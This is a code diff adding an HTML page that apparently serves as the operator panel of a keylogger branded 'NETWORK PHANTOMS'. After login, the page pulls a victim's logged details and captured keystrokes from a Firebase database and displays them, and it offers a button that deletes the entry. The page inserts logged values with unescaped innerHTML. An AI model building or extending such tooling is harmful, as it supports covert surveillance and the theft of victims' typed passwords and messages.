@@ -1,0 +1,307 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="image.png" size="64*64" type="image/png">
+  <title>Details</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+  <style>
+    body {
+      background-color: #121212;
+      color: #ffffff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+      overflow: auto; /* Enable scrolling */
+    }
+
+    .container {
+      max-width: 800px;
+      width: 100%;
+      background-color: rgba(30, 30, 30, 0.9);
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      padding: 30px;
+      z-index: 1;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .header h1 {
+      color: #00ff00;
+      font-size: 2rem;
+    }
+
+    .details-container, .keystrokes-container {
+      margin-top: 20px;
+      padding: 20px;
+      border: 1px solid #00ff00;
+      border-radius: 8px;
+      background-color: rgba(43, 43, 43, 0.9);
+    }
+
+    .list-group-item {
+      background-color: #3c3c3c;
+      color: #00ff00; /* Change values color to green */
+      border: none;
+      text-align: left;
+      font-size: 1.1rem;
+      font-family: 'Courier New', Courier, monospace; /* Terminal-like font */
+    }
+
+    .delete-btn {
+      background-color: #ff4d4d;
+      border: none;
+      color: white;
+      padding: 10px 20px;
+      text-align: center;
+      display: inline-block;
+      margin-top: 20px;
+      cursor: pointer;
+      border-radius: 8px;
+      transition: background-color 0.3s ease;
+    }
+
+    .delete-btn:hover {
+      background-color: #ff1a1a;
+    }
+
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      color: #00ff00;
+      font-size: 0.875rem;
+    }
+
+    #particles-js {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background-color: #121212;
+      z-index: 0;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="particles-js"></div>
+
+  <div class="container">
+    <div class="header">
+      <h1>INFORMATION</h1>
+    </div>
+    <div class="details-container">
+      <h2>Log INFO</h2>
+      <ul id="details-list" class="list-group"></ul>
+    </div>
+    <div class="keystrokes-container">
+      <h2>KEYSTROKES</h2>
+      <div id="keystrokes" class="list-group-item"></div>
+    </div>
+    <button class="delete-btn" id="delete-btn">Delete</button>
+  </div>
+
+  <div class="footer">
+    <p>&copy; NETWORK PHANTOMS</p>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js";
+    import { getDatabase, ref, get, child, remove } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-database.js";
+    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-auth.js";
+
+    const firebaseConfig = {
+      // space for firebase credentials
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase();
+    const auth = getAuth();
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('id');
+    const detailsList = document.getElementById('details-list');
+    const keystrokesDiv = document.getElementById('keystrokes');
+    const deleteBtn = document.getElementById('delete-btn');
+
+    const fetchDetails = async () => {
+      const dbRef = ref(db);
+      try {
+        const snapshot = await get(child(dbRef, `log/${id}`));
+        if (snapshot.exists()) {
+          const data = snapshot.val();
+          console.log('Fetched data:', data);
+          Object.entries(data).forEach(([key, value]) => {
+            if (key === 'keystrokes') {
+              keystrokesDiv.textContent = value;
+            } else {
+              const li = document.createElement('li');
+              li.className = 'list-group-item';
+              li.innerHTML = `<strong>${key}:</strong> ${value}`;
+              detailsList.appendChild(li);
+            }
+          });
+        } else {
+          detailsList.innerHTML = '<li class="list-group-item">No data available</li>';
+          keystrokesDiv.innerHTML = 'No keystrokes data available';
+        }
+      } catch (error) {
+        console.error("Error fetching details: ", error);
+      }
+    };
+
+    const deleteData = async () => {
+      const dbRef = ref(db, `log/${id}`);
+      try {
+        await remove(dbRef);
+        alert("Data deleted successfully!");
+        window.location.href = "keyvault.html";
+      } catch (error) {
+        console.error("Error deleting data: ", error);
+        alert("Failed to delete data!");
+      }
+    };
+
+    deleteBtn.addEventListener('click', deleteData);
+
+    const checkAuthState = () => {
+      onAuthStateChanged(auth, (user) => {
+        if (user) {
+          fetchDetails();
+        } else {
+          window.location.href = "index.html"; // Redirect to login page if not authenticated
+        }
+      });
+    };
+
+    window.addEventListener('load', checkAuthState);
+  </script>
+
+  <!-- Particles.js library -->
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <script>
+    particlesJS('particles-js', {
+      "particles": {
+        "number": {
+          "value": 80,
+          "density": {
+            "enable": true,
+            "value_area": 800
+          }
+        },
+        "color": {
+          "value": "#00ff00"
+        },
+        "shape": {
+          "type": "circle",
+          "stroke": {
+            "width": 0,
+            "color": "#000000"
+          },
+          "polygon": {
+            "nb_sides": 5
+          },
+          "image": {
+            "src": "img/github.svg",
+            "width": 100,
+            "height": 100
+          }
+        },
+        "opacity": {
+          "value": 0.5,
+          "random": false,
+          "anim": {
+            "enable": false,
+            "speed": 1,
+            "opacity_min": 0.1,
+            "sync": false
+          }
+        },
+        "size": {
+          "value": 5,
+          "random": true,
+          "anim": {
+            "enable": false,
+            "speed": 40,
+            "size_min": 0.1,
+            "sync": false
+          }
+        },
+        "line_linked": {
+          "enable": true,
+          "distance": 150,
+          "color": "#00ff00",
+          "opacity": 0.4,
+          "width": 1
+        },
+        "move": {
+          "enable": true,
+          "speed": 6,
+          "direction": "none",
+          "random": false,
+          "straight": false,
+          "out_mode": "out",
+          "bounce": false,
+          "attract": {
+            "enable": false,
+            "rotateX": 600,
+            "rotateY": 1200
+          }
+        }
+      },
+      "interactivity": {
+        "detect_on": "canvas",
+        "events": {
+          "onhover": {
+            "enable": true,
+            "mode": "repulse"
+          },
+          "onclick": {
+            "enable": true,
+            "mode": "push"
+          },
+          "resize": true
+        },
+        "modes": {
+          "grab": {
+            "distance": 400,
+            "line_linked": {
+              "opacity": 1
+            }
+          },
+          "bubble": {
+            "distance": 400,
+            "size": 40,
+            "duration": 2,
+            "opacity": 8,
+            "speed": 3
+          },
+          "repulse": {
+            "distance": 200,
+            "duration": 0.4
+          },
+          "push": {
+            "particles_nb": 4
+          },
+          "remove": {
+            "particles_nb": 2
+          }
+        }
+      },
+      "retina_detect": true
+    });
+  </script>
+</body>
+
+</html>
